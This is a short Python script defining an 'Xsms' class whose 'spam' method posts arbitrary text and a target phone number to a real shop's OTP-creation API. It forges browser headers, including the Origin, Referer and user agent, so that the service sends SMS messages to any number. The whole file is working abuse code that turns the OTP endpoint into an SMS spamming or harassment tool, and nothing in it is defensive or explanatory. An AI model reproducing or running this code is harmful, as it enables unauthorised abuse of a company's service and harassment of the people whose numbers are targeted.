import requests
class Xsms:
    def spam(number,text):
        url ="http://www.amanshops.com/AmanAPI/Installment/CreateOTP"
        data='{"mobileNumber":"%s","HashCode":"%s","lang":"1"}' %(number, text)
        headers = {'Host': 'www.amanshops.com',
'Connection': 'keep-alive',
'Accept': 'application/json, text/plain, */*',
'X-Requested-With': 'XMLHttpRequest',
'User-Agent': 'Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Content-Type': 'application/json;charset=UTF-8',
'Origin': 'http://app.amanmicrofinance.com',
'Referer': 'http://app.amanmicrofinance.com',
'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6,zh-CN;q=0.5,zh;q=0.4',
'Content-Length': '60'}
        
        respone = requests.post(url, headers=headers,data=data).text
        if 'Success' in respone:
            return('Done Message Was Sent')
        elif 'Lenght is 200' in respone:
            return('The Lenght of Message long than 200')
        else:
            return('Check Your Inputs')